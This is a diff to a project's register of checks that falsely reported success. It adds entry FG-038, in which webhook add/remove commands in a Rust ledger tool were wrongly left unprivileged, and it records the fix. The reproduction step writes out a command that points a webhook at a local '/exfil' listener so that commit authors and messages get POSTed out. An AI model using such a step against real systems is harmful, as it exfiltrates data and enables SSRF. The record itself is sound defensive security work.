@@ -200,7 +200,7 @@ A false green is a check, test, or matrix cell that REPORTED SUCCESS while the t
 
 The doctrine they all violate: **success must carry evidence; failure may never synthesize success.**
 
-**0 OPEN, 37 fixed.** An open false green blocks any completeness claim — a harder criterion than the unknown count, and deliberately so: unknowns shrink by doing work, false greens shrink only by admitting a check was lying. The two must never be traded against each other, because relabelling an unknown to improve its count manufactures a false green.
+**0 OPEN, 38 fixed.** An open false green blocks any completeness claim — a harder criterion than the unknown count, and deliberately so: unknowns shrink by doing work, false greens shrink only by admitting a check was lying. The two must never be traded against each other, because relabelling an unknown to improve its count manufactures a false green.
 
 ### FG-001 — scripts/r23_acceptance_gate.sh (security, fixed)
 
@@ -460,4 +460,11 @@ The doctrine they all violate: **success must carry evidence; failure may never 
 - **Reality:** Store::append is the choke point for a record being BORN, not for its bytes changing. replace_record wrote the caller's struct verbatim, and ingest_session returns an UNSTAMPED original while appending a stamped clone — so session-refresh erased recorded_by entirely (the field is skip_serializing_if), leaving a record indistinguishable from a pre-attribution one.
 - **Reproduced:** A record with recorded_by=ci-bot, refreshed via `session-refresh`, came back with the field absent.
 - **Fix:** The rule is now uniform: a method that changes a record's BYTES stamps the writer. replace_record and rewrite_principals stamp; prune is the stated exception because it copies survivors verbatim. Mutation found this fixed-but-untested and a regression test was added. (`7a56aab`)
+
+### FG-038 — crates/axon-ledger/src/main.rs (security, fixed)
+
+- **Claimed:** `requires_admin` is EXHAUSTIVE over the command enum with no `_` arm, so a new command does not compile until someone decides whether it is privileged.
+- **Reality:** Exhaustiveness guarantees a decision is MADE for every command; it cannot catch one decided WRONGLY. `Commands::Webhook` sat in the group commented 'appends NEW records; does not rewrite or reattribute' — but `webhook add`/`rm` append nothing. They write webhooks.json, durable egress configuration that later drives an outbound POST from the ledger host when `pre-deploy` fires.
+- **Reproduced:** RBAC armed (admins=[alice], authenticated_admins=[nobody-real]), caller not an admin: `webhook add --event unexplained-deploy --provider generic --url http://127.0.0.1:9977/exfil` -> exit 0, webhooks.json written; `pre-deploy` then POSTed commit authors, messages and SHAs to that listener; `webhook rm wh_00000001` removed a legitimate admin's hook. Exfiltration, arbitrary-URL SSRF from the ledger host, and silencing another principal's alerting — none of it requiring the dev escape.
+- **Fix:** `webhook add`/`rm` classified privileged, `webhook list` left open as a read (same reasoning as `rbac list`). Regression test names both directions plus the admin control; the destructive-verb sweep gained webhook rows. Mutation-tested by reclassifying it back to non-privileged. Found by an adversarial review AFTER the exhaustive-match change had been described as making a missed classification impossible — the correction to that claim is recorded in the code comment at the arm. (`30fbfaa`)
 
